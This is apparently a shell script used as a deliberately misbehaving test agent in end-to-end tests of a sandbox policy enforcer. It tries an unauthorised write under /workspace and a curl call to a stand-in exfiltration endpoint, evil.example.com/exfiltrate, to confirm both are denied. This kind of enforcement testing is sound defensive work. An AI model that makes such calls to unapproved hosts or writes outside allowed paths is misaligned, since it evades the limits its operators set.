#!/bin/sh
# Bad test agent for E2E round-trip integration tests.
#
# Attempts actions that are NOT in the generated policy:
# - Writes to a read-only directory
# - Hits a different API host than what was observed
#
# Used to verify that enforcement mode correctly denies
# unauthorized activity.
#
# Exit code is intentionally non-zero when enforcement works.

set -e

# Attempt to write a file (should be denied by fs policy)
echo "unauthorized write" > /workspace/unauthorized.txt 2>/dev/null || true

# Attempt to hit an unauthorized host (should be denied by network policy)
curl -sf "https://evil.example.com/exfiltrate" > /dev/null 2>/dev/null || true

echo "test-agent-bad: reached end"
